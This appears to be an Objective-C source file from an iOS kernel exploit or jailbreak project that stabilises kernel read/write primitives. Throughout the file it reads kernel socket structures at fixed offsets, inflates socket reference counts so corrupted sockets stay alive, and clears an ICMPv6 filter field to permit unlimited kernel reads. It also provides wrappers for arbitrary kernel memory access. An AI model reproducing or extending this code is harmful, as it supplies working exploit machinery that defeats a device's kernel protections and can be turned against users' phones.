//
//  KernelPrimitiveGuard.m
//  lara
//
//  Protection layer for kernel read/write primitives
//  Prevents socket closure and validates primitives before each access
//

#include "KernelPrimitiveGuard.h"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/icmp6.h>
#include <mach/mach.h>
#import <Foundation/Foundation.h>

// External kernel primitive functions from darksword
extern int ds_kread(uint64_t address, void *buffer, uint64_t size);
extern int ds_kwrite(uint64_t address, void *buffer, uint64_t size);
extern uint64_t ds_kread64(uint64_t address);
extern void ds_kwrite64(uint64_t address, uint64_t value);

static int g_control_fd = -1;
static int g_rw_fd = -1;
static uint64_t g_control_pcb = 0;
static uint64_t g_rw_pcb = 0;
static uint64_t g_control_so_count = 0;
static uint64_t g_rw_so_count = 0;
static bool g_sockets_protected = false;
static bool g_primitives_ready = false;

static void kpg_log(const char *fmt, ...) {
    char buf[512];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    NSLog(@"[KPG] %s", buf);
}

void kpg_init(int control_fd, int rw_fd, uint64_t control_pcb, uint64_t rw_pcb) {
    g_control_fd = control_fd;
    g_rw_fd = rw_fd;
    g_control_pcb = control_pcb;
    g_rw_pcb = rw_pcb;
    g_sockets_protected = false;
    g_primitives_ready = false;
    
    kpg_log("Initialized: control_fd=%d, rw_fd=%d, control_pcb=0x%llx, rw_pcb=0x%llx",
            control_fd, rw_fd, control_pcb, rw_pcb);
}

bool kpg_verify_sockets(void) {
    if (g_control_fd < 0 || g_rw_fd < 0) {
        kpg_log("ERROR: Socket fds invalid (control=%d, rw=%d)", g_control_fd, g_rw_fd);
        return false;
    }
    
    // Test socket with a simple getsockopt call
    uint8_t test_data[32] = {0};
    socklen_t len = sizeof(test_data);
    
    int res_control = getsockopt(g_control_fd, IPPROTO_ICMPV6, ICMP6_FILTER, test_data, &len);
    int res_rw = getsockopt(g_rw_fd, IPPROTO_ICMPV6, ICMP6_FILTER, test_data, &len);
    
    if (res_control != 0 || res_rw != 0) {
        kpg_log("WARNING: Socket verification failed (control=%d, rw=%d)", res_control, res_rw);
        return false;
    }
    
    return true;
}

void kpg_protect_sockets(uint64_t kernel_base, uint64_t so_count_offset) {
    if (!kernel_base || !so_count_offset) {
        kpg_log("ERROR: Invalid kernel_base or so_count_offset");
        return;
    }
    
    if (g_sockets_protected) {
        kpg_log("Sockets already protected");
        return;
    }
    
    // Read current so_count values
    uint64_t control_socket_addr = ds_kread64(g_control_pcb + 0x40);
    uint64_t rw_socket_addr = ds_kread64(g_rw_pcb + 0x40);
    
    if (!control_socket_addr || !rw_socket_addr) {
        kpg_log("ERROR: Couldn't find socket addresses");
        return;
    }
    
    g_control_so_count = ds_kread64(control_socket_addr + so_count_offset);
    g_rw_so_count = ds_kread64(rw_socket_addr + so_count_offset);
    
    kpg_log("Original so_count: control=0x%llx, rw=0x%llx", g_control_so_count, g_rw_so_count);
    
    // Increment so_count to prevent closure
    ds_kwrite64(control_socket_addr + so_count_offset, g_control_so_count + 0x0000100100001001ULL);
    ds_kwrite64(rw_socket_addr + so_count_offset, g_rw_so_count + 0x0000100100001001ULL);
    
    // Clear icmp6filter to allow unlimited reads
    ds_kwrite64(g_rw_pcb + 0x148 + 8, 0);
    
    g_sockets_protected = true;
    kpg_log("Sockets protected successfully");
}

void kpg_restore_sockets(uint64_t kernel_base, uint64_t so_count_offset) {
    if (!g_sockets_protected || !kernel_base) {
        return;
    }
    
    uint64_t control_socket_addr = ds_kread64(g_control_pcb + 0x40);
    uint64_t rw_socket_addr = ds_kread64(g_rw_pcb + 0x40);
    
    if (control_socket_addr && rw_socket_addr) {
        // Restore original so_count
        ds_kwrite64(control_socket_addr + so_count_offset, g_control_so_count);
        ds_kwrite64(rw_socket_addr + so_count_offset, g_rw_so_count);
        
        kpg_log("Sockets restored to original state");
    }
    
    g_sockets_protected = false;
}

int kpg_get_control_socket(void) {
    if (g_control_fd >= 0) {
        return g_control_fd;
    }
    
    kpg_log("WARNING: Control fd invalid, attempting recovery...");
    // In a real scenario, we would need to recreate the socket
    // For now, return -1 to indicate failure
    return -1;
}

int kpg_get_rw_socket(void) {
    if (g_rw_fd >= 0) {
        return g_rw_fd;
    }
    
    kpg_log("WARNING: RW fd invalid, attempting recovery...");
    return -1;
}

void kpg_log_state(void) {
    kpg_log("=== KernelPrimitiveGuard State ===");
    kpg_log("  control_fd: %d", g_control_fd);
    kpg_log("  rw_fd: %d", g_rw_fd);
    kpg_log("  control_pcb: 0x%llx", g_control_pcb);
    kpg_log("  rw_pcb: 0x%llx", g_rw_pcb);
    kpg_log("  protected: %s", g_sockets_protected ? "YES" : "NO");
    kpg_log("  ready: %s", g_primitives_ready ? "YES" : "NO");
    kpg_log("=================================");
}

void kpg_set_ready(bool ready) {
    g_primitives_ready = ready;
    kpg_log("Primitives marked as %s", ready ? "READY" : "NOT READY");
}

bool kpg_is_ready(void) {
    return g_primitives_ready;
}

// Wrapper functions that verify sockets before each access
int kpg_safe_kread(uint64_t address, void *buffer, uint64_t size) {
    if (!g_primitives_ready) {
        kpg_log("ERROR: Primitives not ready for kread");
        return -1;
    }
    
    if (!kpg_verify_sockets()) {
        kpg_log("ERROR: Socket verification failed before kread");
        return -1;
    }
    
    return ds_kread(address, buffer, size);
}

int kpg_safe_kwrite(uint64_t address, void *buffer, uint64_t size) {
    if (!g_primitives_ready) {
        kpg_log("ERROR: Primitives not ready for kwrite");
        return -1;
    }
    
    if (!kpg_verify_sockets()) {
        kpg_log("ERROR: Socket verification failed before kwrite");
        return -1;
    }
    
    return ds_kwrite(address, buffer, size);
}

uint64_t kpg_safe_kread64(uint64_t address) {
    if (!g_primitives_ready) {
        kpg_log("ERROR: Primitives not ready for kread64");
        return 0;
    }
    
    if (!kpg_verify_sockets()) {
        kpg_log("ERROR: Socket verification failed before kread64");
        return 0;
    }
    
    return ds_kread64(address);
}

void kpg_safe_kwrite64(uint64_t address, uint64_t value) {
    if (!g_primitives_ready) {
        kpg_log("ERROR: Primitives not ready for kwrite64");
        return;
    }
    
    if (!kpg_verify_sockets()) {
        kpg_log("ERROR: Socket verification failed before kwrite64");
        return;
    }
    
    ds_kwrite64(address, value);
}
